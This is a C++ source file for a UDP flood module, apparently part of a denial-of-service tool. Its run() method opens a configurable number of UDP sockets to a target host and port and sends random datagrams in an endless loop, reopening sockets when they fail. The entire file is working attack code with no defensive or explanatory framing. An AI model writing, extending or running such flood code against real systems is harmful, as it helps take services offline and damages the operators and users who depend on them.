#include "udp_flood.h"
#include "utils.h"
#include "socket.h"

udp_flood::udp_flood(std::shared_ptr<Config> config) : Vector(std::move(config)) {

}

void udp_flood::run() {
    std::vector<std::unique_ptr<Socket>> sockets{};
    sockets.reserve(config->conn);
    std::string hdr{};
    int len = 0;
    static bool waned = false;
    if(config->tls && !waned){
        fputs("[-] tls is not available on udp\n", stderr);
        waned = true;
    }
    for(int i = 0; i < config->conn; ++i)
        sockets.emplace_back(std::unique_ptr<Socket>(new Socket(config->rhost.c_str(),
                                                                config->rport.c_str(), SOCK_DGRAM)));


    while(true) {
        for(int i = 0; i < config->conn; ++i) {
            if(!sockets[i]->Alive())
                sockets[i]->Open();
            len = gen_hdr(hdr);
            if(sockets[i]->Write(hdr.c_str(), len) == -1){
                sockets[i]->Close();
                sockets[i]->Open();
            }
            fputs("[+] Voly Sent\n", stderr);
        }
        utils::pause(config->time);
    }

}

int udp_flood::gen_hdr(std::string &string) {
    utils::randomizer::randomstr(string);
    return static_cast<int>(string.length());
}
